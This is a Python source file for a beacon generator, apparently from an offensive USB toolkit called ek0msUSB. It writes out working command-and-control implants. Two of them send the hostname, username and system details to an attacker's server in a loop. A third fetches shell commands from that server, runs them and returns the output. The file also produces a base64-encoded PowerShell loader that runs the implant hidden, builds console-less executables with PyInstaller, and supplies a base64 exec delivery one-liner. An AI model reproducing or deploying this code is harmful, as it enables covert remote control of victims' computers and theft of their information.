#!/usr/bin/env python3
"""
ek0msUSB Beacon Generator - Creates actual beacon payloads dynamically
"""

import os
import tempfile
import subprocess
import shutil
import base64

class BeaconGenerator:
    def __init__(self):
        self.beacon_templates = {
            'simple': self._simple_beacon_template,
            'stealth': self._stealth_beacon_template,
            'advanced': self._advanced_beacon_template
        }
    
    def _simple_beacon_template(self, c2_url):
        """Generate a simple beacon Python script"""
        return f'''#!/usr/bin/env python3
import requests
import platform
import os
import time
import socket
import json
from datetime import datetime

def main():
    c2_url = "{c2_url}"
    beacon_interval = 60
    
    while True:
        try:
            system_info = {{
                "hostname": platform.node(),
                "username": os.getenv("USERNAME"),
                "domain": os.getenv("USERDOMAIN"),
                "os": platform.platform(),
                "arch": platform.architecture()[0],
                "timestamp": datetime.now().isoformat()
            }}
            
            response = requests.post(
                f"{{c2_url}}/beacon",
                json=system_info,
                headers={{'User-Agent': 'ek0msUSB-Beacon/1.0'}},
                timeout=10
            )
            
        except Exception as e:
            pass
            
        time.sleep(beacon_interval)

if __name__ == "__main__":
    main()
'''
    
    def _stealth_beacon_template(self, c2_url):
        """Generate a stealthy beacon Python script"""
        return f'''#!/usr/bin/env python3
import requests
import platform
import os
import time
import sys

def main():
    c2_url = "{c2_url}"
    
    while True:
        try:
            info = {{
                "hostname": platform.node(),
                "username": os.getenv("USERNAME")
            }}
            requests.post(f"{{c2_url}}/beacon", json=info, timeout=15)
        except:
            pass
        time.sleep(120)

if __name__ == "__main__":
    main()
'''
    
    def _advanced_beacon_template(self, c2_url):
        """Generate an advanced beacon with more capabilities"""
        return f'''#!/usr/bin/env python3
import requests
import platform
import os
import time
import subprocess
import base64

class AdvancedBeacon:
    def __init__(self, c2_url):
        self.c2_url = c2_url
        self.beacon_id = platform.node() + "_" + os.getenv("USERNAME")
    
    def check_for_commands(self):
        try:
            response = requests.get(f"{{self.c2_url}}/commands/{{self.beacon_id}}", timeout=10)
            if response.status_code == 200:
                commands = response.json()
                self.execute_commands(commands)
        except:
            pass
    
    def execute_commands(self, commands):
        for cmd in commands:
            try:
                if cmd["type"] == "shell":
                    result = subprocess.check_output(cmd["command"], shell=True, timeout=30)
                    self.report_result(cmd["id"], result.decode('utf-8', errors='ignore'))
            except:
                pass
    
    def report_result(self, cmd_id, result):
        try:
            requests.post(f"{{self.c2_url}}/results", json={{
                "beacon_id": self.beacon_id,
                "command_id": cmd_id,
                "result": result
            }})
        except:
            pass
    
    def run(self):
        while True:
            self.check_for_commands()
            time.sleep(60)

def main():
    beacon = AdvancedBeacon("{c2_url}")
    beacon.run()

if __name__ == "__main__":
    main()
'''
    
    def generate_beacon_source(self, beacon_type='simple', c2_url=None):
        """Generate beacon Python source code"""
        if not c2_url:
            raise ValueError("C2 URL is required")
        
        template = self.beacon_templates.get(beacon_type, self._simple_beacon_template)
        return template(c2_url)
    
    def _create_python_payload(self, python_source, output_name):
        """Create a base64 encoded Python payload that auto-executes"""
        # Encode the Python source
        encoded_source = base64.b64encode(python_source.encode('utf-8')).decode('utf-8')
        
        # Create a PowerShell loader that decodes and runs the Python
        powershell_loader = f'''# ek0msUSB Python Beacon Loader
function Start-PythonBeacon {{
    param([string]$B64PythonCode, [string]$C2Url)
    
    # Decode Python code
    $pythonCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($B64PythonCode))
    
    # Write to temporary file
    $tempDir = $env:TEMP
    $pythonFile = Join-Path $tempDir "{output_name}.py"
    $pythonFile | Out-File -FilePath $pythonFile -Encoding utf8 -InputObject $pythonCode
    
    # Check for Python
    $pythonExe = $null
    if (Get-Command python -ErrorAction SilentlyContinue) {{ $pythonExe = "python" }}
    elseif (Get-Command py -ErrorAction SilentlyContinue) {{ $pythonExe = "py" }}
    else {{
        # Try to find Python in common locations
        $possiblePaths = @(
            "$env:LOCALAPPDATA\\Programs\\Python\\Python39\\python.exe",
            "$env:LOCALAPPDATA\\Programs\\Python\\Python310\\python.exe", 
            "$env:LOCALAPPDATA\\Programs\\Python\\Python311\\python.exe",
            "C:\\Python39\\python.exe",
            "C:\\Python310\\python.exe"
        )
        foreach ($path in $possiblePaths) {{
            if (Test-Path $path) {{ $pythonExe = $path; break }}
        }}
    }}
    
    if ($pythonExe) {{
        # Execute Python beacon hidden
        Start-Process -FilePath $pythonExe -ArgumentList $pythonFile -WindowStyle Hidden
        return $true
    }} else {{
        # Python not found - offer to install or use alternative
        return $false
    }}
}}

# Execute the beacon
$b64Code = "{encoded_source}"
Start-PythonBeacon -B64PythonCode $b64Code -C2Url "{c2_url}"
'''
        
        return base64.b64encode(powershell_loader.encode('utf-8')).decode('utf-8')
    
    def compile_beacon(self, beacon_type='simple', c2_url=None, output_path=None):
        """Generate and compile a beacon - with fallback to Python-based"""
        if not c2_url:
            raise ValueError("C2 URL is required")
        
        print("[*] Attempting to compile beacon with PyInstaller...")
        
        # Try PyInstaller first
        try:
            return self._try_pyinstaller_compilation(beacon_type, c2_url, output_path)
        except Exception as e:
            print(f"[-] PyInstaller failed: {e}")
            print("[*] Falling back to Python-based beacon delivery...")
            return self._create_python_beacon_payload(beacon_type, c2_url, output_path)
    
    def _try_pyinstaller_compilation(self, beacon_type, c2_url, output_path):
        """Try PyInstaller compilation with multiple approaches"""
        # Generate Python source
        source_code = self.generate_beacon_source(beacon_type, c2_url)
        
        # Create temporary Python file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(source_code)
            temp_py_file = f.name
        
        try:
            # Set output path
            if output_path is None:
                output_path = f"beacon_{beacon_type}.exe"
            
            # Use PyInstaller to compile with multiple command attempts
            console_setting = '--console' if beacon_type == 'simple' else '--noconsole'

            # Try different PyInstaller commands
            commands_to_try = [
                ['pyinstaller', '--onefile', console_setting, '--name', output_path.replace('.exe', ''), temp_py_file],
                ['python', '-m', 'PyInstaller', '--onefile', console_setting, '--name', output_path.replace('.exe', ''), temp_py_file],
                ['py', '-m', 'PyInstaller', '--onefile', console_setting, '--name', output_path.replace('.exe', ''), temp_py_file],
                ['py', '-3.9', '-m', 'PyInstaller', '--onefile', console_setting, '--name', output_path.replace('.exe', ''), temp_py_file],
                ['python3', '-m', 'PyInstaller', '--onefile', console_setting, '--name', output_path.replace('.exe', ''), temp_py_file]
            ]

            for cmd in commands_to_try:
                try:
                    print(f"[*] Trying: {' '.join(cmd)}")
                    result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.getcwd())
                    
                    if result.returncode == 0:
                        # Check for output file in different possible locations
                        dist_file = os.path.join('dist', output_path)
                        if os.path.exists(dist_file):
                            # Move to final location if different
                            if output_path != dist_file:
                                shutil.move(dist_file, output_path)
                            print(f"[+] Successfully compiled beacon: {output_path}")
                            return output_path
                        elif os.path.exists(output_path):
                            print(f"[+] Successfully compiled beacon: {output_path}")
                            return output_path
                        else:
                            print(f"[-] Compilation succeeded but EXE not found in expected locations")
                            continue
                    else:
                        print(f"[-] Command failed: {result.stderr}")
                        continue
                except Exception as e:
                    print(f"[-] Command error: {e}")
                    continue

            raise Exception("All PyInstaller commands failed")
                
        finally:
            # Clean up temporary file
            if os.path.exists(temp_py_file):
                os.unlink(temp_py_file)
            
            # Clean up PyInstaller temporary directories
            for temp_dir in ['build', 'dist']:
                if os.path.exists(temp_dir) and os.path.isdir(temp_dir):
                    try:
                        shutil.rmtree(temp_dir)
                    except:
                        pass
            
            # Clean up .spec files
            spec_file = output_path.replace('.exe', '.spec')
            if os.path.exists(spec_file):
                try:
                    os.unlink(spec_file)
                except:
                    pass
    
    def _create_python_beacon_payload(self, beacon_type, c2_url, output_path):
        """Create a Python-based beacon payload when EXE compilation fails"""
        source_code = self.generate_beacon_source(beacon_type, c2_url)
        
        # Create a PowerShell script that will run the Python beacon
        if output_path is None:
            output_path = f"beacon_{beacon_type}_python.txt"
        
        # Encode the entire delivery mechanism
        encoded_payload = base64.b64encode(source_code.encode('utf-8')).decode('utf-8')
        
        # Create a file that contains the encoded Python beacon
        with open(output_path, 'w') as f:
            f.write(f"# ek0msUSB Python Beacon (Base64 Encoded)\n")
            f.write(f"# C2 URL: {c2_url}\n")
            f.write(f"# Beacon Type: {beacon_type}\n")
            f.write(f"# Use with: python -c \"import base64; exec(base64.b64decode('{encoded_payload}'))\"\n")
            f.write(f"ENCODED_BEACON={encoded_payload}\n")
        
        print(f"[+] Created Python-based beacon payload: {output_path}")
        print("[!] Note: Using Python interpreter instead of compiled EXE")
        print("[!] Target must have Python installed")
        
        return output_path
    
    def generate_beacon_only(self, beacon_type='simple', c2_url=None, output_path=None):
        """Generate just the Python beacon source (for testing)"""
        if not c2_url:
            raise ValueError("C2 URL is required")
        
        source_code = self.generate_beacon_source(beacon_type, c2_url)
        
        if output_path is None:
            output_path = f"beacon_{beacon_type}.py"
        
        with open(output_path, 'w') as f:
            f.write(source_code)
        
        print(f"[+] Generated beacon source: {output_path}")
        return output_path
